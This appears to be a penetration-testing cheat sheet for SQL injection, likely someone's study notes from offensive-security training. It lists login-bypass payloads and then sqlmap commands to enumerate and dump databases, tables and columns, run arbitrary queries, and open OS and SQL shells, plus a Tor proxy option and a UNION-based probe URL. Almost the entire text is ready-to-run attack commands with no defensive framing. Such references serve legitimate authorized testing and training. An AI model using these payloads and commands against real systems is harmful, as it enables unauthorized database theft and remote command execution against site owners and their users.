Testing for Bypasses: 

' or 1=1 LIMIT 1 --
' or 1=1 LIMIT 1 -- -
' or 1=1 LIMIT 1#
'or 1#
' or 1=1 --
' or 1=1 -- -

# SQLMAP

## Enumerate databases
`sqlmap --dbms=mysql -u "$URL" --dbs`

## Enumerate tables
`sqlmap --dbms=mysql -u "$URL" -D "$DATABASE" --tables`

## Dump table data
`sqlmap --dbms=mysql -u "$URL" -D "$DATABASE" -T "$TABLE" --dump`

## Dump Columns
`sqlmap --dbms=mysql -u https://megacorpone.com -D "DATABASE" -T "TABLE" -C "COLUMN" --dump`

## List Columns
`sqlmap --dbms=mysql -u https://megacorpone.com -D "DATABASE" -T "TABLE" --columns`

## Specify parameter to exploit
`sqlmap --dbms=mysql -u "http://www.megacorpone.com/param1=value1&param2=value2" --dbs -p param2`

##  Specify parameter to exploit in 'nice' URIs
`sqlmap --dbms=mysql -u "http://www.megacorpone.com/param1/value1*/param2/value2" --dbs # exploits param1`

## Get OS shell
`sqlmap --dbms=mysql -u "$URL" --os-shell`

## Get SQL shell
`sqlmap --dbms=mysql -u "$URL" --sql-shell`

## SQL query
`sqlmap --dbms=mysql -u https://megacorpone.com -D "$DATABASE" --sql-query "SELECT * FROM $TABLE;"`

## Use Tor Socks5 proxy
`sqlmap --tor --tor-type=SOCKS5 --check-tor --dbms=mysql -u https://megacorpone.com --dbs`

## Using SQLMAP with basic authentication or NTLM
`sqlmap -u "http://megacorpone.com/" -s-data=param1=value1&param2=value2 -p param1 --auth-type=[basic/ntlm] --auth-cred=username:password`

# SQLI

Testing for a row: 
`http://target-ip/inj.php?id=1 union all select 1,2,3,4,5,6,7,8`

# Resources: 
- http://www.securityidiots.com/Web-Pentest/SQL-Injection/Union-based-Oracle-Injection.html
- https://cheatography.com/dormidera/cheat-sheets/oracle-sql-injection/
- https://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet